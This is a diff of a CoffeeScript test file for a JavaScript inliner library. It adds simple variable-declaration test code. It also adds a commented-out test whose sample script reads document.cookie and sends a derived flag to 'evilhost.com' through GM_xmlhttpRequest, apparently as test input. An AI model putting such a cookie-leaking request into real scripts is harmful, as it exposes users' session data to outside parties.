@@ -1,43 +1,28 @@
 jsinliner = require "../lib/jsinliner"
 
-exports["jscode"] = (test) ->
+exports["var"] = (test) ->
     code = '''
-        var y = 4;
-        var x = 3;
-        var z = 5;
-
-        if ( z == 5 ) {
-            y = x;
-        } else {
-            x = y;
-        }
+    var x;
+    var y = z = 5;
+    var a, b=5;
+    var c=function(){}
+    x=5
     '''
-    codeNoTested = '''
-    var y = 4;
-    y + 3;
-    if ( y == 10) {
-        y++;
-    }
-
-    eval('hello world!');
-
-    function a() {
-        console.log('hi');
-    };
-    
-    var b = function() {
-        console.log('yeah!');
-    }'''
-
     jsinliner.inline code
-
     test.done()
 
-#exports["test some stuff"] = (test) ->
-#    test.expect 1
-#    test.ok true, "this assertion should pass"
-#    test.done()
+#exports["jscode"] = (test) ->
+#    code = '''
+#        var sec = document.cookie;
+#        var pub = 'noesta!';
 #
-#exports["test some other stuff"] = (test) ->
-#    test.ok false, "this assertion should fail"
+#        if ( sec !== '' ) pub = 'esta!';
+#
+#        GM_xmlhttpRequest({
+#          method: "GET",
+#          url: "http://www.evilhost.com/"+pub
+#        });
+#
+#    '''
+#    jsinliner.inline code
 #    test.done()
